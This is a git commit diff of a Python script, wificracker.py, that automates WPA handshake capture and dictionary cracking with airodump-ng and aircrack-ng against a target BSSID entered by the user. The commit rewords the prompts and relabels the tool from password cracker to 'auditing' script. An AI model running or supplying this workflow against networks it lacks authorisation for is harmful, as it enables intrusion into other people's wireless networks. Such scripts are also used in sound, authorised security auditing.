dec83e57f0a972be62b9d8a4427a887d4c67a6a6
yelhamer <16624109+yelhamer@users.noreply.github.com>
2020-01-03 15:11:08 +0100

    Update wificracker.py

--- wificracker.py
+++ wificracker.py
@@ -25,17 +25,13 @@ logo = """
                     ░                        ░                            
 """
 
-intro = """This is a simple script that cracks nearby wireless networks passwords
-First, enter your wireless card (usually wlan0) then hit enter
-It will give you a list of all available wireless networks in your area
-Copy their BSSID and channel number and save them for later
-Let\'s rock!"""
+intro = """Simple Access-Point Auditing script"""
 
 print colored(logo, 'green')
 print colored(intro, 'green')
 
 # asks for wireless card to apply monitor mode on it
-wireless_card = raw_input("Enter your wireless card: ")
+wireless_card = raw_input("Wireless Interface to use: ")
 
 # turns wireless card into monitor mod
 mon0 = 'ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up'.format(wireless_card)
@@ -46,11 +42,11 @@ airodump = 'airodump-ng {0}'.format(wireless_card)
 system(airodump)
 
 # asks for your target's bssid
-bssid = raw_input("Enter the BSSID of the network you want to crack: ")
+bssid = raw_input("Target's BSSID: ")
 
 # asks for your target's channel
-channel = raw_input("Enter the channel number that the wireless network is currently running on: ")
-save = raw_input("Where should i save the captured handshake? ")
+channel = raw_input("Target's Operating Channel: ")
+save = raw_input("Save Directory ")
 print colored("...", "red"),
 print colored("Airodump will start, in the meanwhile, run deauth.py in a new terminal", "red")
 sleep(5)
@@ -62,8 +58,9 @@ print colored("Handshake is captured", "green")
 print colored("Cracking the handshake with aircrack-ng is starting...", "green")
 
 # 'Aircrack-ng' parameters set
-wordlist = raw_input("Specify the path to your wordlist dictionary: ")
-save2 = raw_input("Enter the .cap file name that is saved in the directory you previously entered: e.g: 01.cap")
-print colored("This could take a while according to the wordlist you are using, so be patient!", "red")
+wordlist = raw_input("Wordlist Path: ")
+save2 = raw_input("Directory of the Previously Generated Cap File e.g. 01.cap")
+print colored("This might take a while", "red")
 crack = 'aircrack-ng -a 2 {0}{1} -w {2} '.format(save, save2, wordlist)
 system(crack)
+print("Quitting")
